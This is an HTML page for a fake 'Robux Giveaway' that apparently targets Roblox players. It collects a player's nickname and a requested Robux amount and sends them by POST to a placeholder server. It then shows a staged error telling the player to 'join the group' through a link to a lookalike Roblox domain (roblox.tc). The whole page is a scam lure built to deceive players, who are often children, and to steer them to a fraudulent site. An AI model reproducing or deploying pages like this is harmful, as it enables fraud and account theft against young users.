<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>üéÑ Robux Giveaway</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: 'Segoe UI', sans-serif;
      background: url('https://i.ibb.co/5x89KSZQ/a4d6ef8664c6f0d81e4f8d5782d48462.jpg') no-repeat center center fixed;
      background-size: cover;
      color: white;
      min-height: 100vh;
      position: relative;
      overflow: hidden;
    }

    .snow {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      pointer-events: none;
      z-index: 0;
    }

    .container {
      position: relative;
      z-index: 1;
      max-width: 400px;
      margin: 10vh auto;
      background: rgba(0, 0, 0, 0.75);
      padding: 30px;
      border-radius: 15px;
      box-shadow: 0 0 20px #ff4444;
      text-align: center;
    }

    h1 {
      margin-bottom: 20px;
      color: #ff4444;
    }

    input, button {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border-radius: 8px;
      border: none;
      font-size: 16px;
    }

    button {
      background-color: #ff4444;
      color: white;
      font-weight: bold;
      cursor: pointer;
    }

    .popup {
      display: none;
      margin-top: 20px;
      background: #111;
      padding: 20px;
      border-radius: 10px;
      border-left: 4px solid red;
    }

    .popup a {
      display: inline-block;
      background-color: #007bff;
      color: white;
      padding: 10px 15px;
      border-radius: 8px;
      text-decoration: none;
      margin-top: 10px;
    }

    @media (max-width: 768px) {
      .container {
        width: 90%;
        margin: 5vh auto;
      }
    }

    @media (max-width: 480px) {
      h1 {
        font-size: 1.5rem;
      }

      input, button {
        font-size: 14px;
        padding: 10px;
      }
    }
  </style>
</head>
<body>
  <canvas class="snow"></canvas>

  <div class="container">
    <h1>üéÅ Robux Giveaway</h1>
    <form id="robuxForm">
      <input type="text" id="nick" placeholder="Your Roblox Nickname" required />
      <input type="number" id="robux" placeholder="Amount of Robux" required />
      <button type="submit" id="submitBtn">Enviar</button>
    </form>
    <div class="popup" id="errorPopup">
      <p>‚ùå ERROR: YOU NEED TO JOIN THE GROUP TO EARN ROBUX</p>
      <p>üí∏ TO RECEIVE YOUR ROBUX, JOIN THE GROUP TO REDEEM ROBUX üëá</p>
      <a href="https://www.roblox.tc/communities/1671585164/RobuxGiveaway" target="_blank">JOIN THE GROUP</a>
    </div>
  </div>

  <script>
    const form = document.getElementById("robuxForm");
    const popup = document.getElementById("errorPopup");
    const submitBtn = document.getElementById("submitBtn");

    form.addEventListener("submit", function (e) {
      e.preventDefault();
      popup.style.display = "block";
      submitBtn.textContent = "Submit";

      const nick = document.getElementById("nick").value;
      const robux = document.getElementById("robux").value;

      fetch("https://seuservidor.com/api/enviar", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({ nick, robux })
      }).then(res => console.log("Dados enviados"))
        .catch(err => console.error("Erro:", err));
    });

    // ‚ùÑÔ∏è N√©voa caindo (simula√ß√£o de neve)
    const canvas = document.querySelector('.snow');
    const ctx = canvas.getContext('2d');
    let width, height;
    let flakes = [];

    function resize() {
      width = canvas.width = window.innerWidth;
      height = canvas.height = window.innerHeight;
    }

    window.addEventListener('resize', resize);
    resize();

    function createFlakes() {
      flakes = [];
      for (let i = 0; i < 100; i++) {
        flakes.push({
          x: Math.random() * width,
          y: Math.random() * height,
          r: Math.random() * 4 + 1,
          d: Math.random() * 100
        });
      }
    }

    function drawFlakes() {
      ctx.clearRect(0, 0, width, height);
      ctx.fillStyle = 'white';
      ctx.beginPath();
      for (let i = 0; i < flakes.length; i++) {
        const f = flakes[i];
        ctx.moveTo(f.x, f.y);
        ctx.arc(f.x, f.y, f.r, 0, Math.PI * 2, true);
      }
      ctx.fill();
      moveFlakes();
    }

    let angle = 0;
    function moveFlakes() {
      angle += 0.01;
      for (let i = 0; i < flakes.length; i++) {
        const f = flakes[i];
        f.y += Math.cos(angle + f.d) + 1 + f.r / 2;
        f.x += Math.sin(angle) * 2;

        if (f.y > height) {
          flakes[i] = { x: Math.random() * width, y: 0, r: f.r, d: f.d };
        }
      }
    }

    createFlakes();
    setInterval(drawFlakes, 25);
  </script>
</body>
</html>
